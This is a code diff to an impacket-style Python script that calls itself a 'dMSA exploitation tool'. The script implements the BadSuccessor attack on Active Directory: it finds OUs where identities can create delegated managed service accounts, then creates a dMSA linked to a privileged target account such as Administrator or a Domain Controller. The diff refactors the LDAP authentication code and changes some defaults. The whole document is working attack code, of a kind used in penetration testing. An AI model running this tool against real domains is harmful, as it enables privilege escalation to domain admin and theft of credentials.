@@ -31,7 +31,7 @@ import ldap3
 
 from impacket import version
 from impacket.examples import logger
-from impacket.examples.utils import parse_identity, parse_target, ldap3_kerberos_login
+from impacket.examples.utils import parse_identity, parse_target, init_ldap_session
 from impacket.ldap import ldaptypes
 
 
@@ -42,7 +42,6 @@ class BADSUCCESSOR:
         self.__domain = domain
         self.__lmhash = lmhash
         self.__nthash = nthash
-        self.__hashes = cmdLineOptions.hashes
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
         self.__target = cmdLineOptions.dc_host
@@ -57,7 +56,6 @@ class BADSUCCESSOR:
         self.__principalsAllowed = cmdLineOptions.principals_allowed
         self.__targetAccount = cmdLineOptions.target_account
         self.__dnsHostName = cmdLineOptions.dns_hostname
-        self.__ldapsFlag = cmdLineOptions.ldaps_flag
 
         if self.__targetIp is not None:
             self.__kdcHost = self.__targetIp
@@ -94,64 +92,36 @@ class BADSUCCESSOR:
 
 
         try:
-            connectTo = self.__target
-            if self.__targetIp is not None:
-                connectTo = self.__targetIp
+            # Use init_ldap_session with LDAPS default, but handle Kerberos properly
+            use_ldaps = (self.__method == 'LDAPS')
             
-            user = '%s\\%s' % (self.__domain, self.__username)
-            use_ldaps = (self.__method == 'LDAPS' or self.__ldapsFlag)
-            
-            if use_ldaps:
-                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2, ciphers='ALL:@SECLEVEL=0')
-                try:
-                    ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
-                    if self.__doKerberos:
-                        ldapConnection = ldap3.Connection(ldapServer)
-                        ldap3_kerberos_login(ldapConnection, connectTo, self.__username, self.__password, self.__domain, 
-                                           self.__lmhash, self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
-                    elif self.__hashes is not None:
-                        ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
-                        if not ldapConnection.bind():
-                            raise Exception('Failed to bind to LDAP with hash')
-                    else:
-                        ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
-                        if not ldapConnection.bind():
-                            raise Exception('Failed to bind to LDAP with password')
-                except ldap3.core.exceptions.LDAPSocketOpenError:
-                    # Try TLSv1 fallback
-                    tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1, ciphers='ALL:@SECLEVEL=0')
-                    ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
-                    if self.__doKerberos:
-                        ldapConnection = ldap3.Connection(ldapServer)
-                        ldap3_kerberos_login(ldapConnection, connectTo, self.__username, self.__password, self.__domain, 
-                                           self.__lmhash, self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
-                    elif self.__hashes is not None:
-                        ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
-                        if not ldapConnection.bind():
-                            raise Exception('Failed to bind to LDAP with hash (fallback)')
-                    else:
-                        ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
-                        if not ldapConnection.bind():
-                            raise Exception('Failed to bind to LDAP with password (fallback)')
+            # For Kerberos authentication, ensure proper target resolution
+            if self.__doKerberos:
+                target_host = self.__target if self.__target else self.__domain
+                dc_ip = self.__kdcHost if self.__kdcHost else self.__targetIp
             else:
-                # Plain LDAP
-                ldapServer = ldap3.Server(connectTo, port=self.__port, get_info=ldap3.ALL)
-                if self.__doKerberos:
-                    ldapConnection = ldap3.Connection(ldapServer)
-                    ldap3_kerberos_login(ldapConnection, connectTo, self.__username, self.__password, self.__domain, 
-                                       self.__lmhash, self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
-                elif self.__hashes is not None:
-                    ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
-                    ldapConnection.bind()
-                else:
-                    ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
-                    ldapConnection.bind()
-                    
+                target_host = self.__target if self.__target else self.__domain
+                dc_ip = self.__targetIp
+            
+            _, ldapConnection = init_ldap_session(
+                domain=self.__domain,
+                username=self.__username,
+                password=self.__password,
+                lmhash=self.__lmhash,
+                nthash=self.__nthash,
+                k=self.__doKerberos,
+                dc_ip=dc_ip,
+                dc_host=target_host,
+                aesKey=self.__aesKey,
+                use_ldaps=use_ldaps
+            )
+            
         except Exception as e:
             raise Exception('Could not connect to LDAP server: %s' % str(e))
 
-        self.__target = connectTo
-        logging.info('Connected to %s as %s\\%s' % (self.__target, self.__domain, self.__username))
+        # Update target for logging
+        connectTo = dc_ip if dc_ip else target_host
+        logging.info('Connected to %s as %s\\%s' % (connectTo, self.__domain, self.__username))
 
 
         if self.__action == 'add':
@@ -184,15 +154,14 @@ class BADSUCCESSOR:
             
             success = ldapConnection.delete(dmsa_dn)
             
-            print("")
-            print("%-30s %s" % ("dMSA Deletion Results", ""))
-            print("%-30s %s" % ("-" * 30, "-" * 30))
-            print("%-30s %s" % ("dMSA Name:", '%s$' % self.__dmsaName))
-            print("%-30s %s" % ("Status:", "SUCCESS" if success else "FAILED"))
+            logging.info("")
+            logging.info("%-30s %s" % ("dMSA Deletion Results", ""))
+            logging.info("%-30s %s" % ("-" * 30, "-" * 30))
+            logging.info("%-30s %s" % ("dMSA Name:", '%s$' % self.__dmsaName))
+            logging.info("%-30s %s" % ("Status:", "SUCCESS" if success else "FAILED"))
             
             if not success and ldapConnection.result:
-                print("%-30s %s" % ("Error:", ldapConnection.result))
-            print("")
+                logging.error("%-30s %s" % ("Error:", ldapConnection.result))
             
             return success
                 
@@ -251,22 +220,14 @@ class BADSUCCESSOR:
                 logging.info('Resulting list of Identities/OUs will show Identities that have permissions to create objects in OUs.')
                     
 
-            
             success = ldapConnection.search(
                 search_base=self.__baseDN,
                 search_filter='(objectClass=organizationalUnit)',
                 search_scope=ldap3.SUBTREE,
                 attributes=['distinguishedName', 'nTSecurityDescriptor'],
-                controls=ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x07)
+                controls=ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x15)
             )
-            
-            if not success:
-                success = ldapConnection.search(
-                    search_base=self.__baseDN,
-                    search_filter='(objectClass=organizationalUnit)',
-                    search_scope=ldap3.SUBTREE,
-                    attributes=['distinguishedName', 'nTSecurityDescriptor']
-                )
+
             
             if not success:
                 logging.error('Failed to search for organizational units: %s' % ldapConnection.result)
@@ -364,22 +325,19 @@ class BADSUCCESSOR:
             
             if allowed_identities:
                 logging.info('Found %d identities with BadSuccessor privileges:' % len(allowed_identities))
-                print("")
-                print("%-50s %s" % ("Identity", "Vulnerable OUs"))
-                print("%-50s %s" % ("-" * 50, "-" * 30))
+                logging.info("")
+                logging.info("%-50s %s" % ("Identity", "Vulnerable OUs"))
+                logging.info("%-50s %s" % ("-" * 50, "-" * 30))
                 
                 for identity, ous in allowed_identities.items():
                     ou_list = "{%s}" % ", ".join(ous)
-                    print("%-50s %s" % (identity[:50], ou_list))
-                print("")
+                    logging.info("%-50s %s" % (identity[:50], ou_list))
             else:
                 logging.info('No identities found with BadSuccessor privileges')
-                print("")
-                print("%-50s %s" % ("Identity", "Vulnerable OUs"))
-                print("%-50s %s" % ("-" * 50, "-" * 30))
-                print("%-50s %s" % ("(none)", "(none)"))
-                print("")
-                
+                logging.info("")
+                logging.info("%-50s %s" % ("Identity", "Vulnerable OUs"))
+                logging.info("%-50s %s" % ("-" * 50, "-" * 30))
+                logging.info("%-50s %s" % ("(none)", "(none)"))
             return True
             
         except Exception as e:
@@ -393,9 +351,9 @@ class BADSUCCESSOR:
         if sid in excluded_sids:
             return True
             
-        if domain_sid:
+        if domain_sid and sid.startswith(domain_sid):
             for suffix in excluded_suffixes:
-                if sid.startswith(domain_sid) and sid.endswith(suffix):
+                if sid.endswith(suffix):
                     return True
                     
         return False
@@ -543,7 +501,7 @@ class BADSUCCESSOR:
                 logging.error('dMSA account already exists: %s' % dmsa_dn)
                 return False
             
-            principals_allowed = self.__principalsAllowed if self.__principalsAllowed else self.__username
+            principals_allowed = self.__principalsAllowed if self.__principalsAllowed else 'Administrator'
             target_account = self.__targetAccount if self.__targetAccount else 'Administrator'
             
             dns_hostname = self.__dnsHostName if self.__dnsHostName else '%s.%s' % (self.__dmsaName.lower(), self.__domain)
@@ -583,7 +541,7 @@ class BADSUCCESSOR:
                 
             except Exception as e:
                 logging.debug('Error building MSA membership: %s' % str(e))
-                return b''
+                return False
             
             if group_msa_membership:
                 attributes['msDS-GroupMSAMembership'] = group_msa_membership
@@ -612,20 +570,17 @@ class BADSUCCESSOR:
             else:
                 logging.error('Target account not found: %s' % target_account)
                 return False
-            if not attributes:
-                logging.error('Failed to prepare dMSA attributes')
-                return False
             
             success = ldapConnection.add(dmsa_dn, attributes=attributes)
 
             if success:
-                print("")
-                print("%-30s %s" % ("-" * 30, "-" * 30))
-                print("%-30s %s" % ("dMSA Name:", '%s$' % self.__dmsaName))
-                print("%-30s %s" % ("DNS Hostname:", attributes.get('dNSHostName', 'Unknown')))
-                print("%-30s %s" % ("Migration status: ", attributes.get('msDS-DelegatedMSAState', 'Unknown')))
-                print("%-30s %s" % ("Principals Allowed:", principals_allowed))
-                print("%-30s %s" % ("Target Account:", target_account))
+                logging.info("")
+                logging.info("%-30s %s" % ("-" * 30, "-" * 30))
+                logging.info("%-30s %s" % ("dMSA Name:", '%s$' % self.__dmsaName))
+                logging.info("%-30s %s" % ("DNS Hostname:", attributes.get('dNSHostName', 'Unknown')))
+                logging.info("%-30s %s" % ("Migration status: ", attributes.get('msDS-DelegatedMSAState', 'Unknown')))
+                logging.info("%-30s %s" % ("Principals Allowed:", principals_allowed))
+                logging.info("%-30s %s" % ("Target Account:", target_account))
                 return True
             else:
                 if ldapConnection.result:
@@ -642,10 +597,10 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = True, description = "dMSA exploitation tool.")
 
     parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
-    parser.add_argument('-dmsa-name', action='store', metavar='dmsa_name', help='Name of dMSA to add. If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.')
+    parser.add_argument('-dmsa-name', action='store', metavar='dmsa_name', help='Name of dMSA to add. If omitted, a random dMSA-[A-Z0-9]{8} will be used.')
     parser.add_argument('-action', choices=['add',  'delete', 'search'], default='search', help='Action to perform: add (requires -principals-allowed, -target-account, -target-ou), delete (requires -dmsa-name, -target-ou), search a dMSA.')
     parser.add_argument('-target-ou', action='store', metavar='OU_DN', help='Specific OU to check for dMSA creation capabilities (e.g., "OU=weakOU,DC=domain,DC=local")')
-    parser.add_argument('-principals-allowed', action='store', metavar='USERNAME', help='Username allowed to retrieve the managed password. If omitted, the current user will be used.')
+    parser.add_argument('-principals-allowed', action='store', metavar='USERNAME', default='Administrator', help='Username allowed to retrieve the managed password. If omitted, Administrator will be used.')
     parser.add_argument('-target-account', action='store', metavar='USERNAME', help='Target user or computer account DN to set for msDS-ManagedAccountPrecededByLink (can target Domain Controllers, Domain Admins, Protected Users, etc.)')
     parser.add_argument('-dns-hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA. If omitted, will be generated as dmsaname.domain.')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
@@ -664,7 +619,6 @@ if __name__ == '__main__':
     group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
     group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used')
     group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. Useful if you can\'t translate the FQDN.')
-    group.add_argument('-use-ldaps', dest='ldaps_flag', action="store_true", help='Enable LDAPS (LDAP over SSL). Required when querying a Windows Server 2025 domain controller with LDAPS enforced.')
 
     if len(sys.argv)==1:
         parser.print_help()
@@ -674,8 +628,6 @@ if __name__ == '__main__':
 
     if options.action == 'add':
         required_args = []
-        if not options.principals_allowed:
-            required_args.append('-principals-allowed')
         if not options.target_account:
             required_args.append('-target-account')
         if not options.target_ou:
